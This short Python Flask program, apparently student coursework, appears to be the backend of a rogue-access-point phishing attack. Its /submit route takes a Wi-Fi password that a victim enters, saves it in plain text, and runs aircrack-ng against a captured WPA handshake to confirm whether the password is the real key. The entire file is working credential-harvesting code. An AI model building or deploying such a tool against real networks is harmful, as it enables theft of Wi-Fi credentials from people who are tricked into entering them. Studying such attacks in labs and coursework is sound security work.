# JONATHAN OWEN PANG
# TP060491

from flask import Flask, render_template, request
import sys, os, subprocess

app = Flask(__name__)
webserver_directory = os.getcwd()

@app.route('/')
def hello():
    return 'Hello World'

@app.route('/submit', methods = ["POST"])
def submit():
    # Store User's Input Password
    user_password = str(request.json["password"])
    #print(webserver_directory, file=sys.stderr)
    password_directory = webserver_directory + "/password.txt"
    print("DEBUG: Password Directory = {}".format(password_directory), file=sys.stderr)
    with open(password_directory, 'w') as fileHandler:
        fileHandler.write(user_password)
        fileHandler.write('\n')
    handshake_directory = '../../handshake/handshake-01.cap'
    print("DEBUG: Handshake Directory = {}".format(handshake_directory, file=sys.stderr))
    with open('handshake_result.txt', 'w') as fileHandler:
        subprocess.run(['aircrack-ng', '-w', password_directory, handshake_directory], stdout=fileHandler)
    with open('handshake_result.txt', 'r') as fileHandler:
        aircrack_text = fileHandler.read()
        if 'KEY FOUND!' in aircrack_text:
            status = "pass"
            print("DEBUG: Status = Pass", file=sys.stderr)
        else:
            status = "fail"
            print("DEBUG: Status = Fail", file=sys.stderr)
    return {"status": status}
